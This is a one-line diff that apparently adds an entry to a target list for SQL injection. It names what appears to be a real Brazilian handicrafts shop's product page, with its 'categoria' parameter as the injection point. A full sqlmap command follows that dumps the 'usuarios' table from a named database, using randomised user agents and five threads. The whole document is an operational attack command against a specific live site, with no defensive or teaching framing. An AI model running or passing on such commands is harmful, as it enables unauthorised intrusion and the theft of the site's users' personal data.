@@ -1,0 +1,1 @@
+https://www.silvasartesanatos.com.br/produtos.php?categoria=19 (GET)  # sqlmap.py -u https://www.silvasartesanatos.com.br/produtos.php?categoria=19 --random-agent --stop=100 -D silvasartesana3 -T usuarios --dump -v3 --threads=5
